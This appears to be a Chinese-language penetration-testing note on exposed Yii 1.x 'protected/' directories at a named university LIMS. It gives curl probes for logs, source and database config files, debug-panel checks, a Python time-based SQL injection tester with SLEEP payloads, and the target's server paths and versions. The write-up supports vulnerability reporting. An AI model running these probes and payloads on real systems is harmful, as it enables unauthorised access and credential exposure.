# Yii 1.x protected/ 目录暴露模式 (ECUT yqgx 2026-06-05)

## 识别特征
- URL含 `/index.php?r=site/index` (Yii路由风格)
- Cookie: `YII_CSRF_TOKEN`, `PHPSESSID`
- 响应头: `X-Powered-By: PHP` (可能被隐藏)
- 框架路径: `/protected/` 目录结构
- Gii代码生成器: `/gii` (通常403)
- Yii Debug Toolbar: `/debug/default/index` (通常404或403)

## 高价值暴露路径

### 1. Application Log (最关键)
```bash
curl -sk 'https://TARGET/protected/runtime/application.log'
```
- 返回200 + 内容 = 泄露服务器路径、框架版本、SQL错误、堆栈跟踪
- ECUT案例: 泄露 `/home/wwwroot/lims/` 和 `Yii 1.1.16`

### 2. PHP源代码错误
以下PHP文件若返回200 + Fatal Error/Warning = 泄露源码路径和类名:
```bash
curl -sk 'https://TARGET/protected/yiic.php'         # 入口脚本
curl -sk 'https://TARGET/protected/commands/*.php'    # 控制台命令
curl -sk 'https://TARGET/protected/controllers/*.php' # 控制器
curl -sk 'https://TARGET/protected/models/*.php'      # 模型
curl -sk 'https://TARGET/protected/components/*.php'  # 组件
```
ECUT案例暴露的类名: `LimsConsoleCommand`, `DdpSevCommand`, `Controller`, `CController`, `CUserIdentity`

### 3. 配置文件 (通常空body)
```bash
curl -sk 'https://TARGET/protected/config/main.php'
curl -sk 'https://TARGET/protected/config/db.php'
curl -sk 'https://TARGET/protected/config/console.php'
curl -sk 'https://TARGET/protected/config/params.php'
```
- 200 + 空body = nginx拦截但未返回404 (仍确认路径存在)
- 200 + 内容 = 严重! 数据库凭据泄露

### 4. Debug/Gii面板
```bash
curl -sk 'https://TARGET/gii'                    # 403 = 存在但受限
curl -sk 'https://TARGET/debug/default/index'    # 200 = Debug面板暴露
curl -sk 'https://TARGET/index.php?r=gii'        # Yii路由方式
```

## 服务器信息汇总
从暴露文件可提取:
- 服务器路径 (如 /home/wwwroot/lims/)
- 框架版本 (如 Yii 1.1.16)
- Web服务器版本 (如 nginx/1.14.1)
- 应用名称 (如 LIMS - 实验室信息管理系统)
- 内部组件名 (如 DdpSevCommand)
- 消息队列配置 (如 AMQP/RabbitMQ exchange_mode=fanout)
- PHP版本 (从错误信息推断)

## 已知Yii 1.x CVE
- CVE-2013-4623: CSecurityManager HMAC key reuse
- CVE-2014-4928: CSecurityManager weak key generation
- CVE-2015-5458: CActiveRecord SQL injection via unsanitized column names
- CVE-2016-5459: CDbCriteria SQL injection
- Yii 1.x EOL since 2014, no security patches

## ⚠️ cid参数时间盲注误判 (ECUT教训)

### 问题
yqgx.edu.cn `instrument.html?cid=` 参数注入SLEEP(3)后延迟3秒, 误判为SQL注入。

### 真相
基准响应时间已~3秒(慢服务器), SLEEP(5)也只~3秒。必须做基线对比:

```python
import httpx, time
# 基线测试(无注入)
baseline_times = []
for cid in ['1', '2', '3']:
    start = time.time()
    r = httpx.get(f'https://TARGET/page?cid={cid}', verify=False, timeout=15)
    baseline_times.append(time.time() - start)
baseline_avg = sum(baseline_times) / len(baseline_times)

# 注入测试
for payload, expected in [('1 AND SLEEP(3)--', 3), ('1 AND SLEEP(5)--', 5)]:
    start = time.time()
    r = httpx.get(f'https://TARGET/page?cid={payload}', verify=False, timeout=20)
    elapsed = time.time() - start
    delay = elapsed - baseline_avg
    if delay > expected * 0.7:
        print(f'[!!!] SQLi CONFIRMED: delay={delay:.1f}s')
    else:
        print(f'[x] No injection: delay={delay:.1f}s (baseline={baseline_avg:.1f}s)')
```

### 规则
- SLEEP(5)响应时间 ≈ 基线时间 → 无SQL注入
- SLEEP(5)响应时间 ≈ 基线+5秒 → SQL注入确认
- **永远先测基线再测注入**

## 登录页面特征
Yii 1.x登录表单:
- `LfsmsLoginForm[username]`, `LfsmsLoginForm[password]`, `LfsmsLoginForm[captcha]`
- 提交到 `/lfsms/user/logindata`
- 使用base64.min.js密码编码

## 注册页面特征
- `Tuser[LoginName]`, `Tuser[nPassword]`, `Tuser[password_repeat]`
- `Tuser[FirstName]`, `Tuser[LastName]`, `Tuser[Email1]`, `Tuser[MobilePhone1]`
- `Tuser[Position]`, `Tuser[OrgID]`, `Tuser[CodeVerify]`

## 报告角度
- "XXX系统存在敏感文件未授权访问致服务器信息泄露" [中危]
- 合并: application.log + PHP源代码错误 = 同一漏洞根因(未授权访问)
- 不要拆成多份报告

## 参考案例
- 东华理工大学 yqgx.ecut.edu.cn (2026-06-05)
  - LIMS系统, Yii 1.1.16, nginx/1.14.1
  - 服务器路径: /home/wwwroot/lims/
  - 框架路径: /home/wwwroot/framework.1.1.16/
  - 组件: DdpSevCommand, LimsConsoleCommand, AMQP/RabbitMQ
  - 5个PHP文件暴露 + 1个日志文件暴露
